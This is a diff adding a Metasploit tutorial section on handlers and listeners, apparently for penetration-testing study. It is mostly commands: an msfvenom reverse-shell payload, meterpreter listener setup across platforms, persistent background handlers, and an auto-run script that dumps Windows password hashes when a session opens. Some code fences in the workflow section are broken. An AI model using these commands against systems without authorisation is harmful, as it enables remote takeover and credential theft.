@@ -1691,3 +1691,274 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x 
 
 
 
+
+# 8. Handlers and Listeners
+
+### What Is a Handler?
+
+A handler is a listener that waits for a payload to connect back to you. When an exploit succeeds and the payload runs on the target, the payload reaches out to your handler, and you get a session.
+
+**Without a handler, you have no session.**
+
+---
+
+### The Multi/Handler Module
+
+`exploit/multi/handler` is the universal listener. It works with any payload (Windows, Linux, Android, etc.).
+
+**Basic setup:**
+```bash
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+- Now wait. When your payload executes, you'll get a session.
+
+
+
+## Handler Options
+
+|Option |Purpose |Example|
+|----|----|----|
+|LHOST |Your IP address (where payload connects back to) |set LHOST 192.168.1.5|
+|LPORT |Your listening port| set LPORT 4444|
+|ExitOnSession| Exit handler after one session? |set ExitOnSession false|
+|ReverseListenerBindAddress| Bind to specific interface |set ReverseListenerBindAddress 192.168.1.5|
+|ReverseAllowProxy| Allow connections through proxy| set ReverseAllowProxy true|
+
+
+## Multiple Sessions (Keep Handler Running)
+
+- By default, the handler exits after the first session. To handle multiple connections:
+
+```bash
+set ExitOnSession false
+run -j
+```
+
+- "-j" runs the handler as a background job
+- "ExitOnSession" false keeps the handler alive after each session
+
+
+## Running Handler as a Background Job
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+run -j
+```
+
+- Now you have a persistent listener running in the background. You can continue using msfconsole while it listens.
+
+- **Check running jobs:**
+
+```bash
+jobs
+```
+
+- **Kill a job:**
+
+```bash
+jobs -k [job_id]
+```
+
+
+## Handling Different Payload Types
+
+|Payload Type |Handler Setup| Notes|
+|----|----|----|
+|reverse_tcp |set payload windows/x64/meterpreter/reverse_tcp |Most common|
+|reverse_http| set payload windows/x64/meterpreter/reverse_http| Blends with web traffic|
+|reverse_https| set payload windows/x64/meterpreter/reverse_https| Encrypted|
+|bind_tcp |set payload windows/x64/meterpreter/bind_tcp, set RHOST 192.168.1.10| Target connects to you? No, you connect to target|
+
+- **For bind payloads (target listens, you connect):**
+  
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST 192.168.1.10
+set LPORT 4444
+run
+```
+
+
+## Auto-Run Scripts on Session Open
+
+- You can automatically run commands or scripts when a session opens.
+
+- **Option 1: Auto-run Meterpreter commands**
+
+```bash
+set AutoRunScript migrate -f
+```
+
+- **Option 2: Auto-run resource script**
+
+```bash
+set AutoRunScript multi_console_command -r /path/to/script.rc
+```
+
+- **Example resource script (auto.rc):**
+
+```bash
+getuid
+sysinfo
+run post/windows/gather/hashdump
+```
+
+- **Then set:**
+
+```bash
+set AutoRunScript multi_console_command -r /path/to/auto.rc
+```
+
+- When a session opens, it automatically runs those commands.
+
+
+## Payload Configuration for Specific Targets
+
+- **Windows 10/11 (x64)**
+
+```bash
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+- **Windows 7 (x86)**
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+```
+
+- **Linux**
+
+```bash
+set payload linux/x64/meterpreter/reverse_tcp
+```
+
+- **macOS**
+
+```bash
+set payload osx/x64/meterpreter/reverse_tcp
+```
+
+- **Android**
+
+```bash
+set payload android/meterpreter/reverse_tcp
+```
+
+
+## Real-World Handler Workflow
+
+```bash
+- Start msfconsole with database
+```bash 
+msfconsole -d
+```
+- Create a workspace
+```bash 
+workspace -a Engagement1
+```
+- Set up handler
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+```
+- Run as background job
+```
+run -j
+```bash 
+- Verify it's running
+```bash 
+jobs
+```
+- Now run your exploit or deliver your payload...
+- When payload runs, you'll get a session automatically
+
+- Interact with session when it arrives
+```bash 
+sessions
+```
+- To stop the handler when done
+```bash 
+jobs -k [job_id]
+```
+
+
+## Common Handler Issues and Fixes
+
+|Problem |Cause |Solution|
+|----|----|----|
+|Payload runs but no session |Wrong LHOST or firewall blocking| Check IP, disable firewall, use port 443|
+|Connection refused| No listener running| Start handler before running payload|
+|Session drops immediately |Unstable payload or network| Use different payload, add pingback option|
+|Multiple sessions not working |ExitOnSession is true| Set ExitOnSession false|
+|Payload connects to wrong IP| Staged payload with wrong LHOST |Regenerate payload with correct LHOST|
+
+
+
+## Testing Your Handler Setup
+
+- **Step 1: Start handler**
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+
+- **Step 2: Generate test payload**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe
+```
+
+- **Step 3: Run test.exe on your own Windows VM**
+
+- **Step 4: Check handler output**
+
+```text
+[*] Started reverse TCP handler on 192.168.1.5:4444
+[*] Sending stage (200774 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened
+```
+
+- If you see this, your handler is working correctly.
+
+
+## Handler Cheat Sheet
+
+|Task| Command|
+|----|----|
+|Start handler| use exploit/multi/handler|
+|Set payload| set payload [path]|
+|Set your IP| set LHOST [IP]|
+|Set your port| set LPORT [port]|
+|Keep handler alive| set ExitOnSession false|
+|Run in background |run -j|
+|List jobs| jobs|
+|Kill job| jobs -k [id]|
+|List sessions| sessions|
+|Interact with session |sessions -i [id]|
+
+
+
+
+
+
+
+
+
+
